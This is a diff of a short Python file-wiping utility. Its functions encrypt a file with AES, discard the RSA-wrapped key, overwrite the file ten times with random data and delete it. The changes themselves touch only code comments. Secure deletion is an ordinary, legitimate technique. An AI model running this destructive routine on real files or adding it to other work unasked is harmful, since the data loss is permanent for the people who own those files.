@@ -34,7 +34,7 @@ def harpoon(file: str) -> None:
 
 # Encrypts a file with AES, encrypts the encryption key with RSA, than throws the now encrypted key away
 def scramble_coms(file: str) -> None:
-    # Generate an RSA key pair and cipher# NOTE: WORKS!!! - remove me after the destroyer is done
+    # Generate an RSA key pair and cipher#
     rsa_keys = RSA.generate(4096)
     rsa_public_key = rsa_keys.publickey()
     rsa_cipher = PKCS1_OAEP.new(rsa_public_key)
@@ -61,7 +61,7 @@ def scramble_coms(file: str) -> None:
 # Destroys (harpoons) and encryptes (scrambles coms) a file, than deletes it
 def torpedo(file: str) -> None:
     try:
-        # Encrypt the file
+        # Encrypt the file with aes after adding some junk data to it
         scramble_coms(file)
         # Destory the file (overwrite the entire file 10 times with random data)
         harpoon(file)
